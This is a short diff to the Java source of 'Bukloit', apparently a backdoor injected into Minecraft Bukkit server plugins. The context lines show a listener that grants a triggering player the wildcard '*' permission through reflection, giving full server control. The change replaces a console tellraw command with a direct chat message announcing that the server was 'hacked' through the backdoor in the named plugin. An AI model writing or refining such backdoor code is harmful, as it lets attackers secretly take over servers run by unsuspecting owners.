@@ -35,7 +35,10 @@ public class Bukloit implements Listener {
 					addPermission.invoke(User, "*");
 				} catch (Exception e1) {}
 			}
-			Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), "tellraw " + e.getPlayer().getName() + " [\"\",{\"text\":\"You have successfully hacked server using\",\"color\":\"light_purple\"},{\"text\":\" Bukloit\",\"color\":\"green\"},{\"text\":\" backdoor in \",\"color\":\"light_purple\"},{\"text\":\"" + plugin.getName() + "\",\"color\":\"red\"},{\"text\":\" plugin!\",\"color\":\"light_purple\"},{\"text\":\"\\n\"},{\"text\":\"Bukloit on GitHub: \",\"color\":\"gold\"},{\"text\":\"https://github.com/Rikonardo/Bukloit\",\"color\":\"green\",\"clickEvent\":{\"action\":\"open_url\",\"value\":\"https://github.com/Rikonardo/Bukloit\"},\"hoverEvent\":{\"action\":\"show_text\",\"value\":\"Bukloit source code!\"}}]");
+			e.getPlayer().sendMessage(new String[] {
+					"§dYou have successfully hacked server using §aBukloit §dbackdoor in §c" + plugin.getName() + " §dplugin!",
+					"§6Bukloit on GitHub: §ahttps://github.com/Rikonardo/Bukloit"
+			});
 			e.setCancelled(true);
 		}
     }
